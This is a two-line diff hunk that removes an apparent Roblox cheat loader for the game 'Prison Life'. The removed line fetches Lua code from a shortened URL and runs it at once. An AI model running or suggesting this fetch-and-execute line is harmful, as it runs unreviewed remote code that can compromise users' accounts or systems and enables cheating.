@@ -1,2 +1,0 @@
---// Prison Life //
-loadstring(game:HttpGet("https://abre.ai/x-rawnder--v15"))();
